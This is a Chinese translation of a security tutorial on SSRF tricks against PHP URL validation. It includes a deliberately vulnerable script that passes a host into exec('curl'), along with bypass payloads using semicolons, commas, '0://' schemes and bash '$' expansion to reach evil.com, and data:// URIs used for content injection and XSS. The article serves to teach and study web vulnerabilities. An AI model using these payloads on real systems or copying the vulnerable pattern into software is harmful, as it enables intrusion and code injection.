> 原文链接: https://www.anquanke.com//post/id/101058 


# SSRF技巧之如何绕过filter_var( )


                                阅读量   
                                **234245**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">9</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者theMiddle，文章来源：medium.com
                                <br>原文地址：[https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t011b99ad2bc33e797c.png)](https://p3.ssl.qhimg.com/t011b99ad2bc33e797c.png)



## 0x00 前言

前几天我读了两篇非常棒的论文：第一篇是发表在blackhat.com上的“A New Era of SSRF ”，讲述的是不同编程语言的SSRF问题；第二篇是由Positive Technology发表的一篇名为“PHP Wrapper” 的论文，它主要讲述的是如何以多种不同的方式使用PHP Wrapper来绕过过滤器以及受过滤的输入（您可以在结尾处找到这两个链接）。

在本文中，我将深入介绍一些SSRF技术，您可以使用这些技术攻击那些使用filter_var()或preg_match()等过滤器的PHP脚本，并且可以使用curl或file或file_get_contents()来获取HTTP内容。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01167b5a7b41758bcc.png)

图1：对于抓娃娃机的一种典型的SSRF攻击

引用OWASP上的定义：

> 在服务器端请求伪造（SSRF）攻击中，攻击者可以利用服务器上的功能来读取或更新内网资源。 攻击者可以配置或更改与服务器上运行的代码有关的URL链接来读取或提交数据，此外，通过精心构造的URL，攻击者可以读取服务器配置，例如AWS元数据，连接到启用http数据库的内部服务器中抑或是对内部的非公开服务发起post请求。



## 0x01 PHP中易受攻击的代码

本文所有的实验代码都是基于PHP7.0.25完成的（或许当你读到这篇文章时，它已经过时了，但描述的技术细节和原理都是有效的）。

[![](https://p5.ssl.qhimg.com/t013af72c23ea52e767.png)](https://p5.ssl.qhimg.com/t013af72c23ea52e767.png)

图2：使用的PHP版本

以下是我用来测试的PHP脚本：

```
&lt;?php
   echo "Argument: ".$argv[1]."n";
   // check if argument is a valid URL
   if(filter_var($argv[1], FILTER_VALIDATE_URL)) `{`
      // parse URL
      $r = parse_url($argv[1]);
      print_r($r);
      // check if host ends with google.com
      if(preg_match('/google.com$/', $r['host'])) `{`
         // get page from URL
         exec('curl -v -s "'.$r['host'].'"', $a);
         print_r($a);
      `}` else `{`
         echo "Error: Host not allowed";
      `}`
   `}` else `{`
      echo "Error: Invalid URL";
   `}`
?&gt;
```

如您所见，脚本从第一个参数中获取URL（可以是web应用中的post方式或者get方式），然后使用函数filter_var()来验证URL的格式。如果没问题，解析函数parse_url()会解析URL，再使用函数preg_match()用正则表达式来检查主机名是否以google.com结尾。

如果一切正常，脚本会通过curl发起一个http请求以获取目标网页内容，之后使用print_r()打印出响应主体。



## 0x02 预期行为

此PHP脚本只能接受针对google.com 主机名的请求，其余目标一律拒绝，不如让我们试一试：

```
http://google.com
```

[![](https://p3.ssl.qhimg.com/t01152b2f32dbce6d23.png)](https://p3.ssl.qhimg.com/t01152b2f32dbce6d23.png)

图3：尝试请求google.com页面

```
http://evil.com
```

[![](https://p1.ssl.qhimg.com/t012a298fefe35164e6.png)](https://p1.ssl.qhimg.com/t012a298fefe35164e6.png)

图4：尝试请求evil.com页面

截止目前，一切都很顺利。第一个针对google.com 的请求被接受，而第二个对evil.com的请求被拒绝。安全等级：1337+ 呵呵。



## 0x03 绕过URL验证和正则表达式

在上文我并不美观的代码中，正则表达用于检验请求主机名是否以google.com结尾。这似乎很难避免，但倘若你熟悉URI RFC语法，你应该明白分号和逗号可能是你利用远程主机上的ssrf的秘密武器。

许多URL方案中都有保留字符，保留字符都有特定含义。它们在URL的方案特定部分中的外观具有指定的语义。如果在一个方案中保留了与八位组相对应的字符，则该八位组必须被编码。除了字符“;”, “/”, “?”, “:”, “@”, “=” 和 “&amp;” 被定义为保留字符，其余一律为不保留字符。

除了分层路径中的dot-segments之外，一般语法认为路径段不透明。 生成应用程序的URI通常使用段中允许的保留字符来分隔scheme-specific或者dereference-handler-specific子组件。 例如分号(“；”) 和等于(“=”) 保留字符通常用于分隔适用于该段的参数和参数值。 逗号(“，”) 保留字符通常用于类似目的。

例如，一个URI生产者可能使用一个段name;v=1.1来表示对“name”版本1.1的引用，而另一个可能使用诸如“name，1.1”的段来表示相同含义。参数类型可以由scheme-specific 语义来定义，但在大多数情况下，一个参数的语法是特定的URI引用算法的实现。

例如，若应用于主机evil.com;google.com可能会被curl 或者wget 解析成hostname: evil.com 和 querystring: google.com，不如来试一下：

```
http://evil.com;google.com
```

[![](https://p3.ssl.qhimg.com/t017b36869fffe358b6.png)](https://p3.ssl.qhimg.com/t017b36869fffe358b6.png)

图5：尝试用 ;google.com bypass 过滤器

函数filter_var()可以解析许多类型的 URL schema，从上面可以看出filter_var()拒绝以主机名和“HTTP”作为schema验证我请求的URL，但如果我把 schema从http:// 改成别的会怎样呢？

```
0://evil.com;google.com
```

[![](https://p4.ssl.qhimg.com/t015baa3e805d413905.png)](https://p4.ssl.qhimg.com/t015baa3e805d413905.png)

图6：过滤器被使用0代替HTTP bypass掉了

完美！成功绕过filter_var() 和preg_match()，但是curl依然请求不到evil.com页面。。。。为什么呢？不如来尝试下使用别的语法，尽量让;google.com不被解析成主机名的一部分，例如通过制定目标端口：

```
0://evil.com:80;google.com:80/
```

[![](https://p5.ssl.qhimg.com/t01abd97b577d417f1c.png)](https://p5.ssl.qhimg.com/t01abd97b577d417f1c.png)

图7：SSRF使curl对evil.com进行了请求而不是google.com

耶，我们看到curl已经开始连接evil.com，使用逗号代替分号会出现同样的情况 ：

```
0://evil.com:80,google.com:80/
```

[![](https://p5.ssl.qhimg.com/t01e749a88fcca0fa58.png)](https://p5.ssl.qhimg.com/t01e749a88fcca0fa58.png)

图8：相同的SSRF不过此处使用逗号代替分号



## 0x04 对URL解析函数进行SSRF

parse_url()是用于解析一个 URL 并返回一个包含在 URL 中出现的各种组成部分关联数组的PHP函数。这个函数并不是要验证给定的URL，它只是将它分解成上面列出的部分。 部分网址也可以作为parse_url()的输入并被尽可能的正确解析。

在一个PHP脚本中去bypass一个用于将部分字符串转换为一个变量的的正则表达式是我们最喜欢研究的技术之一。这项工作是否成功最终将由Bash来认定。例如：

```
0://evil$google.com
```

[![](https://p2.ssl.qhimg.com/t01d243e62c0c4cb8b9.png)](https://p2.ssl.qhimg.com/t01d243e62c0c4cb8b9.png)

图9：使用“Bash中变量的语法”来绕过过滤器并利用SSRF

使用这种方式，我让bash将$google分析为一个空变量，并且使用curl请求了evil &lt;empty&gt; .com。 这是不是很酷？:)

然而这只发生在curl语法中。 实际上，正如上面的屏幕截图所示，由parse_url()解析的主机名仍然是 evil$google.com。 $ google变量并没有被解释。 只有当使用了exec()函数而且脚本又使用$r[‘host’]来创建一个curl HTTP请求时，Bash才会将其转换为一个空变量。

显然，这个工作只是为了防止PHP脚本使用exec()或system()函数来调用像curl，wget之类的系统命令。



## 0x05 win环境中data:// 之于XSS

另一个使用file_get_contents()代替PHP使用system()或exec()调用curl的例子：

```
&lt;?php
   echo "Argument: ".$argv[1]."n";
   // check if argument is a valid URL
   if(filter_var($argv[1], FILTER_VALIDATE_URL)) `{`
      // parse URL
      $r = parse_url($argv[1]);
      print_r($r);
      // check if host ends with google.com
      if(preg_match('/google.com$/', $r['host'])) `{`
         // get page from URL
         $a = file_get_contents($argv[1]);
         echo($a);
      `}` else `{`
         echo "Error: Host not allowed";
      `}`
   `}` else `{`
      echo "Error: Invalid URL";
   `}`
?&gt;
```

正如你所见，file_get_contents()在使用之前描述的相同技术验证之后使用了原始参数变量。 让我们尝试通过注入一些文本来修改响应主体，如“I Love PHP”：

```
data://text/plain;base64,SSBsb3ZlIFBIUAo=google.com
```

[![](https://p4.ssl.qhimg.com/t01ec063c5c1e59879b.png)](https://p4.ssl.qhimg.com/t01ec063c5c1e59879b.png)

图10：尝试控制响应主体

parse_url()不允许将文本设置为请求主机，并且它返回了“not allowed host”正确拒绝解析。不要绝望！ 有一件事我们可以做，我们可以尝试将某些东西“注入”URI的MIME类型部分……因为在这种情况下，PHP不关心MIME类型…也是，又有谁在乎呢？

```
data://google.com/plain;base64,SSBsb3ZlIFBIUAo=
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0191160045f05b5907.png)

图11：向响应体注入 “I love PHP”

接下来进行XSS攻击便是小菜一碟了…

```
data://text.google.com/plain;base64,&lt;...b64...&gt;
```

[![](https://p2.ssl.qhimg.com/t01fa3cc222d2adb74f.png)](https://p2.ssl.qhimg.com/t01fa3cc222d2adb74f.png)

图12：使用之前描述的技术进行简单的XSS

以上便是全部，感谢观看！



## 0x06 Links

Positive Technologies: “PHP Wrappers” [http://bit.ly/2lXk1e8](http://bit.ly/2lXk1e8)

Orange Tsai: “A new era of SSRF” [http://ubm.io/2FdUu9F](http://ubm.io/2FdUu9F)
